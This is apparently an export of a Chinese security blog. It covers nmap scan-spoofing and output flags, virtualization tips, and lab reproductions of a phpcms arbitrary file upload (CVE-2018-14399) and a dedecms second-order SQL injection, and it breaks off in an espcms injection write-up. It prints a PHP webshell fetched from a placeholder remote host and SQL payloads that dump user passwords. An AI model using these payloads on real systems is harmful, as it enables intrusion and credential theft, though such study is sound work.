class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="源地址欺骗"><a href="#源地址欺骗" class="headerlink" title="源地址欺骗"></a>源地址欺骗</h4><p>这个标志的另一个用处是哄骗性的扫描，使得目标认为是另一个地址在进行扫描。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sI</span> 欺骗ip:80 <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="使用指定的接口"><a href="#使用指定的接口" class="headerlink" title="使用指定的接口"></a>使用指定的接口</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-e</span> interface <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="源端口欺骗"><a href="#源端口欺骗" class="headerlink" title="源端口欺骗"></a>源端口欺骗</h4><p>Nmap提供了<code>-g</code>和<code>--source-port</code>选项(它们是 等价的)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --source-port <span class="token number">902</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="指定发包长度"><a href="#指定发包长度" class="headerlink" title="指定发包长度"></a>指定发包长度</h4><p>这个选项告诉Nmap在发送的报文上附加指定数量的随机字节</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --data-length <span class="token number">30</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="设置IP-time-to-live域"><a href="#设置IP-time-to-live域" class="headerlink" title="设置IP time-to-live域"></a>设置IP time-to-live域</h4><p>设置IPv4报文的time-to-live域为指定的值。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">--ttl</span> <span class="token operator">&lt;</span>value<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="目标主机随机排序"><a href="#目标主机随机排序" class="headerlink" title="目标主机随机排序"></a>目标主机随机排序</h4><p>告诉Nmap在扫描主机前对每个组中的主机随机排列，最多可达 8096个主机。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --randomize-hosts <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="MAX地址欺骗"><a href="#MAX地址欺骗" class="headerlink" title="MAX地址欺骗"></a>MAX地址欺骗</h4><p>要求Nmap在发送原以太网帧时使用指定的MAC地址，这个选项隐含了 <code>--send-eth</code>选项，以保证Nmap真正发送以太网包。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sT</span> <span class="token parameter variable">-Pn</span> --spoof-mac <span class="token number">0</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>Nmap提供5种不同的输出格式。默认的方式是<code>interactive output</code>， 发送给标准输出(stdout)。</p><h4 id="标准保存"><a href="#标准保存" class="headerlink" title="标准保存"></a>标准保存</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-oN</span> d:/xxx.txt <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="XML保存"><a href="#XML保存" class="headerlink" title="XML保存"></a>XML保存</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-oX</span> d:/xxx.xml <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="133t-保存"><a href="#133t-保存" class="headerlink" title="133t 保存"></a>133t 保存</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-oS</span> d:/xxx.txt <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Grep-保存"><a href="#Grep-保存" class="headerlink" title="Grep 保存"></a>Grep 保存</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-oG</span> d:/xxx.txt <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="保存到所有格式"><a href="#保存到所有格式" class="headerlink" title="保存到所有格式"></a>保存到所有格式</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-oA</span> d:/xxx <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="补充保存文件"><a href="#补充保存文件" class="headerlink" title="补充保存文件"></a>补充保存文件</h4><p>在输出文件中添加</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> -append-output <span class="token parameter variable">-oN</span> d:/xxx.txt <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="转换-XML-保存"><a href="#转换-XML-保存" class="headerlink" title="转换 XML 保存"></a>转换 XML 保存</h4><p>常见的调用方式是<code>--stylesheet https://nmap.org/data/nmap.xsl</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token parameter variable">-oX</span> xxx.xml <span class="token parameter variable">--stylesheet</span> https://nmap.org/data/nmap.xsl <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="忽略-XML-声明的-XSL-样式表"><a href="#忽略-XML-声明的-XSL-样式表" class="headerlink" title="忽略 XML 声明的 XSL 样式表"></a>忽略 XML 声明的 XSL 样式表</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-oX</span> d:/xxx.xml --no-stylesheet <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="继续中断的扫描"><a href="#继续中断的扫描" class="headerlink" title="继续中断的扫描"></a>继续中断的扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">--resume</span> <span class="token operator">&lt;</span>filename<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-v</span> <span class="token punctuation">(</span>提高输出信息的详细度<span class="token punctuation">)</span><span class="token parameter variable">-d</span> <span class="token punctuation">[</span>level<span class="token punctuation">]</span> <span class="token punctuation">(</span>提高或设置调试级别<span class="token punctuation">)</span>--packet-trace <span class="token punctuation">(</span>跟踪发送和接收的报文<span class="token punctuation">)</span><span class="token parameter variable">--iflist</span> <span class="token punctuation">(</span>列举接口和路由<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="扫描IPV6地址"><a href="#扫描IPV6地址" class="headerlink" title="扫描IPV6地址"></a>扫描IPV6地址</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-6</span> IPv6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="激烈扫描模式"><a href="#激烈扫描模式" class="headerlink" title="激烈扫描模式"></a>激烈扫描模式</h4><p>全面扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="说明用户Nmap数据文件位置"><a href="#说明用户Nmap数据文件位置" class="headerlink" title="说明用户Nmap数据文件位置"></a>说明用户Nmap数据文件位置</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">--datadir</span> <span class="token operator">&lt;</span>directoryname<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="使用原以太网帧发送"><a href="#使用原以太网帧发送" class="headerlink" title="使用原以太网帧发送"></a>使用原以太网帧发送</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --send-eth<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="在原IP层发送"><a href="#在原IP层发送" class="headerlink" title="在原IP层发送"></a>在原IP层发送</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --send-ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="假定用户具有全部权限"><a href="#假定用户具有全部权限" class="headerlink" title="假定用户具有全部权限"></a>假定用户具有全部权限</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">--privileged</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="打印版本信息"><a href="#打印版本信息" class="headerlink" title="打印版本信息"></a>打印版本信息</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -V/--version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="打印帮助摘要面"><a href="#打印帮助摘要面" class="headerlink" title="打印帮助摘要面"></a>打印帮助摘要面</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -h/--help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware Workstation 在此主机上不支持嵌套虚拟化</title>
      <link href="/2021/12/04/vmwareworkstation-zai-ci-zhu-ji-shang-bu-zhi-chi-qian-tao-xu-ni-hua/"/>
      <url>/2021/12/04/vmwareworkstation-zai-ci-zhu-ji-shang-bu-zhi-chi-qian-tao-xu-ni-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="VMware-Workstation-在此主机上不支持嵌套虚拟化"><a href="#VMware-Workstation-在此主机上不支持嵌套虚拟化" class="headerlink" title="VMware Workstation 在此主机上不支持嵌套虚拟化"></a>VMware Workstation 在此主机上不支持嵌套虚拟化</h1><p>当想要使用vmware的虚拟化引擎，遇到了以下问题</p><ul><li><p>此主机支持AMD-V，但AMD-V处于禁用状态</p><p>这是因为物理机没有打开虚拟化，参照<a href="https://0xdadream.github.io/2021/11/27/kai-qi-xu-ni-hua/">开启虚拟化 | 逐梦 (0xdadream.github.io)</a></p></li><li><p>此平台不支持AMD-V</p></li><li><p>VMware Workstation 在此主机上不支持嵌套虚拟化</p><p>这时你需要打开控制面板-》程序与应用-》启用或关闭windows功能，取消勾选Hyper-V</p><p><img src="https://images.dadream.eu.org/images/2024/07/3a9773b4b6ec7f3723a3a29c229b2dda.png"></p><p>不用管下面那个虚拟化</p><p>然后右键开始菜单-》计算机管理-》服务和应用程序-》服务，找到HV主机服务，禁用</p><p><img src="https://images.dadream.eu.org/images/2024/07/2a4f1faff457aac72c981ec4eb2acf3f.png"></p><p>这样还没有完全禁用，管理员权限运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bcdedit /set hypervisorlaunchtype off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就能完全禁用了，重启便可使用镶嵌虚拟化</p><p>想要再启用hyper，关闭禁用，运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bcdedit /set hypervisorlaunchtype auto<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这主要是由于hyper和vmware的兼容性问题导致的，退回低版本可能也可以解决，我没试过哈</p></li></ul><p>上述的是专业版的Windows，家庭版好像程序和应用里没有Hyper-V，就不用去去掉复选框，其他解决方法和上面一样</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpcmsv9.6.0任意文件上传漏洞CVE-2018-14399</title>
      <link href="/2021/12/02/phpcmsv9.6.0-ren-yi-wen-jian-shang-chuan-lou-dong/"/>
      <url>/2021/12/02/phpcmsv9.6.0-ren-yi-wen-jian-shang-chuan-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="phpcmsv9-6-0任意文件上传漏洞CVE-2018-14399"><a href="#phpcmsv9-6-0任意文件上传漏洞CVE-2018-14399" class="headerlink" title="phpcmsv9.6.0任意文件上传漏洞CVE-2018-14399"></a>phpcmsv9.6.0任意文件上传漏洞CVE-2018-14399</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>下载phpcmsv9.6.0，然后安装</p><p>登录到后台</p><p><img src="https://images.dadream.eu.org/images/2024/07/e0e5d69445e98d8dea8663a94929c0ce.jpg"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>进入注册页面，填写注册信息</p><p><img src="https://images.dadream.eu.org/images/2024/07/35792f526406248ea5cf080047820369.png"></p><p>点击注册bp抓包</p><p><img src="https://images.dadream.eu.org/images/2024/07/cc4b00f681c6f7fbca23b81c6e795726.png"></p><p>在另一个开启web服务的主机的web根目录下创建一个txt文件，写入一句话木马</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">eavl</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造poc</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">siteid</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">modelid</span><span class="token operator">=</span><span class="token number">10</span><span class="token operator">&amp;</span><span class="token assign-left variable">username</span><span class="token operator">=</span>test<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span>testtest<span class="token operator">&amp;</span><span class="token assign-left variable">pwdconfirm</span><span class="token operator">=</span>testtest<span class="token operator">&amp;</span><span class="token assign-left variable">email</span><span class="token operator">=</span>test%40gmail.com<span class="token operator">&amp;</span><span class="token assign-left variable">nickname</span><span class="token operator">=</span>test<span class="token operator">&amp;</span>info<span class="token punctuation">[</span>content<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&lt;</span>img <span class="token assign-left variable">src</span><span class="token operator">=</span>http://xxxxxip/shell.txt?.php<span class="token comment">#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加poc到包中</p><p><img src="https://images.dadream.eu.org/images/2024/07/3b48dde6309666674c3b12712b704fb9.png"></p><p>发送包，然后从响应中获得shell.php的路径，再通过蚁剑连接</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dedecms二次注入漏洞</title>
      <link href="/2021/11/30/dedecms-er-ci-zhu-ru-lou-dong/"/>
      <url>/2021/11/30/dedecms-er-ci-zhu-ru-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="dedecms二次注入漏洞"><a href="#dedecms二次注入漏洞" class="headerlink" title="dedecms二次注入漏洞"></a>dedecms二次注入漏洞</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先搭建环境，注意php版本不要大于5.3，安装完后删除install文件夹</p><p>进入主页是这样的</p><p><img src="https://images.dadream.eu.org/images/2024/07/a72c0587bfe3f74f402b1314c92e3107.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>漏洞点在<code>\dedecms\plus\feedback.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//保存评论内容</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$comtype</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'comments'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$arctitle</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$title</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$inquery</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`, `mid`,`bad`,`good`,`ftype`,`face`,`msg`)               VALUES ('<span class="token interpolation"><span class="token variable">$aid</span></span>','<span class="token interpolation"><span class="token variable">$typeid</span></span>','<span class="token interpolation"><span class="token variable">$username</span></span>','<span class="token interpolation"><span class="token variable">$arctitle</span></span>','<span class="token interpolation"><span class="token variable">$ip</span></span>','<span class="token interpolation"><span class="token variable">$ischeck</span></span>','<span class="token interpolation"><span class="token variable">$dtime</span></span>', '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cfg_ml</span><span class="token operator">-&gt;</span><span class="token constant">M_ID</span><span class="token punctuation">}</span></span>','0','0','<span class="token interpolation"><span class="token variable">$feedbacktype</span></span>','<span class="token interpolation"><span class="token variable">$face</span></span>','<span class="token interpolation"><span class="token variable">$msg</span></span>'); "</span><span class="token punctuation">;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$dsql</span><span class="token operator">-&gt;</span><span class="token function">ExecuteNoneQuery</span><span class="token punctuation">(</span><span class="token variable">$inquery</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rs</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">ShowMsg</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' 发表评论错误! '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'-1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//echo $dsql-&gt;GetError();</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$arctitle = addslashes($title);</code>，把传进来的内容转义了，然后下面insert把转义后的内容插入到数据库，这儿没有什么异常</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//引用回复</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$comtype</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'reply'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$dsql</span><span class="token operator">-&gt;</span><span class="token function">GetOne</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Select * from `#@__feedback` where id ='<span class="token interpolation"><span class="token variable">$fid</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$arctitle</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arctitle'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$aid</span> <span class="token operator">=</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$quotemsg</span><span class="token operator">.</span><span class="token variable">$msg</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">HtmlReplace</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$inquery</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`,`mid`,`bad`,`good`,`ftype`,`face`,`msg`)VALUES ('<span class="token interpolation"><span class="token variable">$aid</span></span>','<span class="token interpolation"><span class="token variable">$typeid</span></span>','<span class="token interpolation"><span class="token variable">$username</span></span>','<span class="token interpolation"><span class="token variable">$arctitle</span></span>','<span class="token interpolation"><span class="token variable">$ip</span></span>','<span class="token interpolation"><span class="token variable">$ischeck</span></span>','<span class="token interpolation"><span class="token variable">$dtime</span></span>','<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cfg_ml</span><span class="token operator">-&gt;</span><span class="token constant">M_ID</span><span class="token punctuation">}</span></span>','0','0','<span class="token interpolation"><span class="token variable">$feedbacktype</span></span>','<span class="token interpolation"><span class="token variable">$face</span></span>','<span class="token interpolation"><span class="token variable">$msg</span></span>')"</span><span class="token punctuation">;</span><span class="token variable">$dsql</span><span class="token operator">-&gt;</span><span class="token function">ExecuteNoneQuery</span><span class="token punctuation">(</span><span class="token variable">$inquery</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$row = $dsql-&gt;GetOne("Select * from </code>#@__feedback<code> where id ='$fid'");</code></p><p><code>$arctitle = $row['arctitle'];</code></p><p>这两句代码将id为fid的评论的读取出来，并将之前保存的标题赋值给arctitle，然后再将这个值插入数据库中，这时插入的值是没有经过addslashes转义的，这就导致了二次注入</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>先用管理员账号新增一个栏目用来发表文章dedecms/dede/</p><p><img src="https://images.dadream.eu.org/images/2024/07/2ee04dc00404e80bc7030a47fd2728e5.png"></p><p>注册一个普通用户用来做测试对象</p><p><img src="https://images.dadream.eu.org/images/2024/07/39d4e1964304da5688416a73e8538e61.png"></p><p>进入主页随便发布一篇文章</p><p><img src="https://images.dadream.eu.org/images/2024/07/9280b647ce4c8b5b9d7da0dbf1bafd37.png"></p><p>第一次注入</p><p>根据代码构造payload</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">get  http:<span class="token comment">//dedecms/plus/feedback.php?aid=1</span>post  <span class="token keyword">action</span><span class="token operator">=</span>send<span class="token operator">&amp;</span>comtype<span class="token operator">=</span>comments<span class="token operator">&amp;</span>aid<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>isconfirm<span class="token operator">=</span>yes<span class="token operator">&amp;</span>msg<span class="token operator">=</span>xx<span class="token operator">&amp;</span>validate<span class="token operator">=</span>GVZH<span class="token operator">&amp;</span>title<span class="token operator">=</span>xx<span class="token string">',(char(@`'</span><span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>aid为文章ID号，action为处理方式，comtype为操作方式，vaildate为验证码，也能注释掉方便测试，title未标题，构建payload的地方，其他参数审计得到</p><p>注释验证码</p><p><img src="https://images.dadream.eu.org/images/2024/07/146b7de895917c4e4086cd4707925e9a.png"></p><p>执行注入就会发表一条评论，可以看到注入单引号被转义了</p><p><img src="https://images.dadream.eu.org/images/2024/07/219fb762991726610f47e58e92b613b8.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/b2b61c5c5cbcc9b89a5a1c42fbfb882c.png"></p><p>第二次注入</p><p>在第一条评论上注入</p><p>fid为评论的ID号</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">get  http:<span class="token comment">//dedecms/plus/feedback.php?aid=1</span>post  <span class="token keyword">action</span><span class="token operator">=</span>send<span class="token operator">&amp;</span>comtype<span class="token operator">=</span>reply<span class="token operator">&amp;</span>fid<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>isconfirm<span class="token operator">=</span>yes<span class="token operator">&amp;</span>validate<span class="token operator">=</span>xx<span class="token operator">&amp;</span>msg<span class="token operator">=</span><span class="token operator">*</span><span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment">/**/</span>concat<span class="token punctuation">(</span>userid<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>pwd<span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token keyword">from</span><span class="token comment">/**/</span>xxxxx_member<span class="token comment">/**/</span><span class="token keyword">limit</span><span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/d554ba1d0411ed7e7d75dd7b518d86bc.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/838befebdd5c5dccd8ecdae24f1a6fb9.png"></p><p>这里可以证实读取出来的acrtitle是没有转义的，再和msg拼接就造成了恶意sql代码的执行，并且把执行结果暴露出来了</p><p>至此复现成功</p><p>这里贴一下后台的数据库</p><p><img src="https://images.dadream.eu.org/images/2024/07/e31b87f57662165e6b344e557bcabaec.png"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开启虚拟化</title>
      <link href="/2021/11/27/kai-qi-xu-ni-hua/"/>
      <url>/2021/11/27/kai-qi-xu-ni-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="开启虚拟化"><a href="#开启虚拟化" class="headerlink" title="开启虚拟化"></a>开启虚拟化</h1><p>我的CPU是AMD，Intel也差不多</p><p>在vmware创建虚拟机时，开启了AMD-V，如图</p><p><img src="https://images.dadream.eu.org/images/2024/07/c03cd6f5a915d3fee66ad30232f55c22.png"></p><p>可能会遇到这种情况</p><p><img src="https://images.dadream.eu.org/images/2024/07/96c8a061aad840bb3d7a61cd1f2e0015.png"></p><p>这时我们需要进入BIOS，开启虚拟化AMD-V</p><p>开机或重启（进入系统之前）按下F2或者Delete（各品牌电脑电脑有差别，自行查阅）</p><p><img src="https://images.dadream.eu.org/images/2024/07/71c4de87984d5279343c6b575d9d50d4.jpg"></p><p>进入这个页面Configuration，选择AMD SVM Technology，改为Enable，F10保存退出</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>espcms搜索注入</title>
      <link href="/2021/11/25/espcms-sou-suo-zhu-ru/"/>
      <url>/2021/11/25/espcms-sou-suo-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="espcms搜索注入"><a href="#espcms搜索注入" class="headerlink" title="espcms搜索注入"></a>espcms搜索注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>二次urldecode注入</p><p>使用了<code>urldecode</code>或者<code>rawurldecode</code>函数可能会导致单引号（’）、双引号（”）、反斜杠（/）等符号被注入到语句，进而产生漏洞</p><p><code>addslashes()</code>、<code>mysql_real_escape_string()</code>、<code>mysql_escape_string()</code>等函数能对<code>urldecode()</code>后的结果处理，从而避免产生漏洞</p><p>eg:</p><p><code>xx.php?id=1%2527</code>，浏览器接收后先进行一次自解码<code>id=1%27</code>，%25解码为%，<code>urlencode()</code>再解码，变成<code>id=1'</code>，产生注入漏洞</p><p>代码审计的时候可以通过搜索这两个函数<code>urldecode</code>或者<code>rawurldecode</code>来寻找漏洞</p><h2 id="操作演示"><a href="#操作演示" class="headerlink" title="操作演示"></a>操作演示</h2><p>先搭建环境，进入首页，配置好数据库及其他配置</p><p>漏洞在<code>interface/search.php</code>文件和<code>interface/3gwap_search.php</code>文件<code>in_taglist()</code>函数</p><p><img src="https://images.dadream.eu.org/images/2024/07/59195d643c2222e1700406d1010483c0.png"></p><p>可以看到一个搜索框和两个参数，审计代码</p><p>代码中有三个函数，<code>in_list(),in_result(),in_taglist()</code>，第二函数应该是调用函数，阅读代码得到第三个参数是tagkey</p><p>函数代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">in_taglist</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">start_pagetemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include_once</span> admin_ROOT <span class="token operator">.</span> <span class="token string single-quoted-string">'public/class_pagebotton.php'</span><span class="token punctuation">;</span><span 